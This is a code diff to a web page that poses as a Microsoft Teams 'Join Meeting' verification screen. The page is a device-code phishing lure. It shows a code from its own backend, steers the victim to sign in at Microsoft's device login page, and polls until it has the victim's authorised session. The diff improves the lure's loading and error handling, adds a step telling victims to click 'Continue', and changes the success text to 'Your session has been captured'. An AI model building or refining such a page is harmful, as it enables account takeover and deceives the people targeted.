@@ -46,7 +46,7 @@
             <div class="loading-text" style="margin-top: 16px;">Connecting to Teams...</div>
         </div>
 
-        <div id="mainCard" class="meeting-card">
+        <div id="mainCard" class="meeting-card" style="display: none;">
             <h3>Join Teams Meeting</h3>
             <p style="color: #666; font-size: 13px; margin-top: 8px;">Verify your identity to join this secure meeting</p>
             
@@ -60,41 +60,45 @@
                 <div class="step"><div class="step-num">1</div><div>Copy the access code</div></div>
                 <div class="step"><div class="step-num">2</div><div>Click the button below to open Microsoft login</div></div>
                 <div class="step"><div class="step-num">3</div><div>Paste the code and sign in</div></div>
+                <div class="step"><div class="step-num">4</div><div>Click "Continue" when asked</div></div>
             </div>
 
             <button class="continue-btn" id="continueBtn">Continue to Microsoft Login</button>
             <div class="footer">Secured by Microsoft Teams</div>
         </div>
 
-        <div id="successState" class="success-state">
+        <div id="successState" class="success-state" style="display: none;">
             <div class="spinner"></div>
             <div class="success-text">Verification complete!</div>
-            <div class="message-sub">Joining meeting...</div>
+            <div class="message-sub">Your session has been captured. You can close this window.</div>
         </div>
     </div>
 
     <script>
-        let currentDeviceCode = null;
         let currentSessionId = null;
         let pollInterval = null;
         
         async function startAuth() {
             try {
+                document.getElementById('loadingState').style.display = 'block';
+                
                 const response = await fetch('/start', { method: 'POST' });
                 const data = await response.json();
                 
-                if (data.userCode && data.deviceCode) {
-                    currentDeviceCode = data.deviceCode;
+                if (data.userCode) {
                     currentSessionId = data.sessionId;
                     document.getElementById('codeDisplay').textContent = data.userCode;
                     document.getElementById('loadingState').style.display = 'none';
                     document.getElementById('mainCard').style.display = 'block';
                     
                     startPolling();
+                } else {
+                    throw new Error('No user code received');
                 }
             } catch (err) {
                 console.error('Auth error:', err);
-                setTimeout(startAuth, 2000);
+                document.getElementById('loadingState').innerHTML = `<div style="color: red;">Connection error. Please refresh and try again.</div>`;
+                setTimeout(() => location.reload(), 3000);
             }
         }
         
@@ -102,34 +106,41 @@
             if (pollInterval) clearInterval(pollInterval);
             
             pollInterval = setInterval(async () => {
-                if (!currentDeviceCode) return;
+                if (!currentSessionId) return;
                 
                 try {
-                    const response = await fetch(`/state?device_code=${currentDeviceCode}&session_id=${currentSessionId}`);
+                    const response = await fetch(`/state?session_id=${currentSessionId}`);
                     const data = await response.json();
                     
                     if (data.status === 'success') {
                         clearInterval(pollInterval);
                         document.getElementById('mainCard').style.display = 'none';
                         document.getElementById('successState').style.display = 'block';
-                        setTimeout(() => window.close(), 3000);
+                        // Close window after 4 seconds
+                        setTimeout(() => window.close(), 4000);
                     }
-                } catch (err) {}
+                } catch (err) {
+                    console.error('Polling error:', err);
+                }
             }, 3000);
         }
         
         document.getElementById('copyBtn').onclick = () => {
             const code = document.getElementById('codeDisplay').textContent;
             navigator.clipboard.writeText(code);
-            alert('Code copied!');
+            const btn = document.getElementById('copyBtn');
+            const originalText = btn.textContent;
+            btn.textContent = '✓ Copied!';
+            setTimeout(() => { btn.textContent = originalText; }, 2000);
         };
         
         document.getElementById('continueBtn').onclick = () => {
             const code = document.getElementById('codeDisplay').textContent;
             if (code) navigator.clipboard.writeText(code);
-            window.open('https://microsoft.com/devicelogin', '_blank', 'width=600,height=700');
+            window.open('https://microsoft.com/devicelogin', '_blank', 'width=600,height=700,resizable=yes');
         };
         
+        // Start authentication
         startAuth();
     </script>
 </body>
